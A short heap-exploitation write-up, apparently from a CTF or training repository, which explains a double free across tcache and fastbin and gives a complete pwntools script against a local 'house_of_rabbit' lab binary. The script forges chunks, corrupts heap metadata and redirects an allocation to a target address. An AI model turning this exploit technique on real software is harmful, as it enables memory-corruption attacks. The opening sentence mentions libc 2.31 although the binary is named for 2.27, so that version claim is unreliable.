libc 2.31 added mesurements to make sure a chunk is not freed twice under tcache, but it doesnt account for if the chunk belong to two different bins like both tcache and fastbin, thus we can treat that as a double free to again, point our to-be-malloc'd chunk to our target

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_rabbit_2.27")

context.binary = exe
context.log_level="debug"

script='''
b main
c
c
'''

def malloc(size, data):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("size:")
    r.sendline(str(size).encode())
    r.recvuntil("data:")
    r.send(data)

def free(index):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("index:")
    r.sendline(str(index).encode())

def name(data):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil("name:")
    r.send(data)


def main():
    global r
    # r=gdb.debug(exe.path,gdbscript=script)
    r = process(exe.path)

    filler=b"\x00"

    payload=flat(
        0,
        0,
        -0x20,
        0x21,
        0,
        0,
        0x20,
        -0x1f
    )
    r.send(payload)
    malloc(0x18,filler)
    malloc(0x18,filler)

    malloc(0x60000,filler)

    free(2)

    malloc(0x60000,filler)

    free(0)
    free(1)
    free(0)

    malloc(0x18,flat(0x602070,0))
    malloc(0x88,filler)

    free(5)

    payload=flat(
        0,
        0,
        0,
        0x80001
    )
    name(payload)

    malloc(0x80000,filler)

    payload=flat(
        -0x10,
        0,
        0,
        -0xf
    )
    name(payload)

    malloc(-0x80,filler)

    payload=flat(
        "PWNED",
        0
    )

    malloc(0x58,payload)

    r.recvuntil(">")
    r.sendline("4")

    r.interactive()


if __name__ == "__main__":
    main()

```